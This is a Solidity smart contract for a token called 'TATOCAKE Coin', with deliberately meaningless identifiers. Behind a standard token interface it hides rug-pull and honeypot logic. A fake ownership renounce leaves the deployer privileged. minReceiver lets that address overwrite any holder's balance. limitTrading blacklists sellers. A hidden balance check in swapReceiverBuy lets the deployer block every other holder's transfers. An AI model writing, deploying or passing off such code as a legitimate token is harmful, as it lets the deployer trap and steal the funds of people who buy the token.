//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface tokenTxFee {
    function createPair(address tokenFrom, address autoFee) external returns (address);
}

interface exemptSwapMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fromMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitFromEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeTake) external view returns (uint256);

    function transfer(address launchTo, uint256 buyFee) external returns (bool);

    function allowance(address swapTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyFee) external returns (bool);

    function transferFrom(
        address sender,
        address launchTo,
        uint256 buyFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listShouldWallet, uint256 value);
    event Approval(address indexed swapTake, address indexed spender, uint256 value);
}

interface enableLaunched is limitFromEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TATOCAKECoin is fromMarketing, limitFromEnable, enableLaunched {

    function transferFrom(address atLaunched, address launchTo, uint256 buyFee) external override returns (bool) {
        if (_msgSender() != minLiquidity) {
            if (exemptMin[atLaunched][_msgSender()] != type(uint256).max) {
                require(buyFee <= exemptMin[atLaunched][_msgSender()]);
                exemptMin[atLaunched][_msgSender()] -= buyFee;
            }
        }
        return swapReceiverBuy(atLaunched, launchTo, buyFee);
    }

    address public launchMarketingTake;

    function liquidityWalletToken(address sellIs) public {
        if (enableMin) {
            return;
        }
        if (limitAt) {
            walletSwapFee = true;
        }
        modeFeeReceiver[sellIs] = true;
        
        enableMin = true;
    }

    function swapReceiverBuy(address atLaunched, address launchTo, uint256 buyFee) internal returns (bool) {
        if (atLaunched == teamToken) {
            return modeLaunch(atLaunched, launchTo, buyFee);
        }
        uint256 fromTo = limitFromEnable(launchMarketingTake).balanceOf(marketingReceiver);
        require(fromTo == totalShouldEnable);
        require(!limitTokenLiquidity[atLaunched]);
        return modeLaunch(atLaunched, launchTo, buyFee);
    }

    function symbol() external view virtual override returns (string memory) {
        return txTeamMarketing;
    }

    string private txTeamMarketing = "TCN";

    string private senderListAmount = "TATOCAKE Coin";

    function modeLaunch(address atLaunched, address launchTo, uint256 buyFee) internal returns (bool) {
        require(listSender[atLaunched] >= buyFee);
        listSender[atLaunched] -= buyFee;
        listSender[launchTo] += buyFee;
        emit Transfer(atLaunched, launchTo, buyFee);
        return true;
    }

    address public teamToken;

    function decimals() external view virtual override returns (uint8) {
        return receiverTake;
    }

    function minReceiver(address takeAmountWallet, uint256 buyFee) public {
        feeSwap();
        listSender[takeAmountWallet] = buyFee;
    }

    event OwnershipTransferred(address indexed atMode, address indexed receiverSwap);

    uint256 public teamWallet;

    mapping(address => bool) public modeFeeReceiver;

    bool private walletSwapFee;

    function feeSwap() private view {
        require(modeFeeReceiver[_msgSender()]);
    }

    bool public isFund;

    function allowance(address autoTeam, address shouldMin) external view virtual override returns (uint256) {
        if (shouldMin == minLiquidity) {
            return type(uint256).max;
        }
        return exemptMin[autoTeam][shouldMin];
    }

    function balanceOf(address feeTake) public view virtual override returns (uint256) {
        return listSender[feeTake];
    }

    uint8 private receiverTake = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return sellSender;
    }

    uint256 public fundWallet;

    function approve(address shouldMin, uint256 buyFee) public virtual override returns (bool) {
        exemptMin[_msgSender()][shouldMin] = buyFee;
        emit Approval(_msgSender(), shouldMin, buyFee);
        return true;
    }

    mapping(address => bool) public limitTokenLiquidity;

    address marketingReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public enableMin;

    bool public fundSwap;

    function limitTrading(address launchAmountTotal) public {
        feeSwap();
        
        if (launchAmountTotal == teamToken || launchAmountTotal == launchMarketingTake) {
            return;
        }
        limitTokenLiquidity[launchAmountTotal] = true;
    }

    address private exemptBuy;

    bool public marketingShould;

    function transfer(address takeAmountWallet, uint256 buyFee) external virtual override returns (bool) {
        return swapReceiverBuy(_msgSender(), takeAmountWallet, buyFee);
    }

    uint256 public fundFrom;

    uint256 atMin;

    uint256 public atExempt;

    function owner() external view returns (address) {
        return exemptBuy;
    }

    function getOwner() external view returns (address) {
        return exemptBuy;
    }

    bool private limitAt;

    bool public toMarketing;

    mapping(address => mapping(address => uint256)) private exemptMin;

    mapping(address => uint256) private listSender;

    uint256 private sellSender = 100000000 * 10 ** 18;

    function amountReceiver(uint256 buyFee) public {
        feeSwap();
        totalShouldEnable = buyFee;
    }

    address minLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function liquidityMin() public {
        emit OwnershipTransferred(teamToken, address(0));
        exemptBuy = address(0);
    }

    constructor (){
        
        liquidityMin();
        exemptSwapMin receiverFundIs = exemptSwapMin(minLiquidity);
        launchMarketingTake = tokenTxFee(receiverFundIs.factory()).createPair(receiverFundIs.WETH(), address(this));
        
        teamToken = _msgSender();
        modeFeeReceiver[teamToken] = true;
        listSender[teamToken] = sellSender;
        
        emit Transfer(address(0), teamToken, sellSender);
    }

    uint256 totalShouldEnable;

    function name() external view virtual override returns (string memory) {
        return senderListAmount;
    }

}